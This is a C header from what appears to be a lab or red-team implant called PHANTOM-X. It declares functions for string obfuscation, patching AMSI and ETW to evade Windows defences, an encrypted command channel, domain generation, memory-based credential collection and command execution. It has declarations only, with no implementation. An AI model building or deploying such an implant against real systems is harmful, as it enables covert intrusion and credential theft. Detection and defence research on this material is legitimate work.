/* ================================================================== */
/* PHANTOM-X :: shared declarations for the capability variants        */
/* ================================================================== */
/*                                                                        */
/* The variants live in separate translation units so that the baseline */
/* build genuinely does not contain them: a capability that is not      */
/* compiled in cannot be detected, and a lab that claims a capability   */
/* is "present but disabled" is not the same as one where the code is   */
/* not there at all.                                                    */
/*                                                                        */
/* Every entry point has a no-op definition in its own file when the   */
/* variant is disabled, so the payload links identically either way.    */
/* ================================================================== */

#ifndef PX_VARIANT_H
#define PX_VARIANT_H

#include <windows.h>
#include <stddef.h>

/* --- string obfuscation ---------------------------------------------- */
/* Decode an encoded string into `out`. Returns the length written. */
unsigned int px_obf_decode(unsigned int index, char *out, unsigned int cap);

/* --- AMSI ------------------------------------------------------------ */
/* Patch AmsiScanBuffer so it reports clean without scanning.
 * Returns 1 on success. */
int px_amsi_bypass(void);

/* --- ETW ------------------------------------------------------------- */
/* Patch EtwEventWrite so it returns without tracing.
 * Returns 1 on success. */
int px_etw_unhook(void);

/* --- encrypted channel ----------------------------------------------- */
/* Read the shared key. Called before the handshake. */
void px_ks_readkey(void);
/* Build the keystreams. Called AFTER the handshake, because the
 * handshake itself travels in the clear. */
void px_ks_setup(void);
int px_ks_active(void);
unsigned int px_ks_encrypt(const char *plain, unsigned int plainlen,
                           unsigned char *out, unsigned int outcap);
unsigned int px_ks_decrypt(const unsigned char *frame, unsigned int framelen,
                           char *out, unsigned int outcap);

/* --- domain generation ----------------------------------------------- */
unsigned int px_dga_host(char *out, unsigned int cap);
int px_dga_port(int fallback);

/* --- credential access ----------------------------------------------- */
/* Collect credential material from the lab VM.
 *
 * Writes a REDACTED summary to `report`: counts and a masked sample.
 * The secret material itself never goes on the wire. */
int px_cred_collect(char *report, unsigned int cap);

/* The size of the memory window read from the target process. */
#define PX_CRED_READ_WINDOW (256 * 1024)

/* --- small helpers shared by the variants --------------------------- */
/* A bounded snprintf that always terminates. Returns the length that
 * WOULD have been written, so the caller can detect truncation. */
unsigned int px_snprintf(char *out, unsigned int cap, const char *fmt, ...);

/* A case-insensitive compare. The payload has no CRT, so strcmp and
 * friends are not available. */
int px_stricmp(const char *a, const char *b);

/* Run a command and capture its output.
 *
 * The returned buffer is heap-allocated and the caller frees it. */
char *px_run_capture(const char *cmd, char *out, unsigned int cap, long *rc);

#endif /* PX_VARIANT_H */
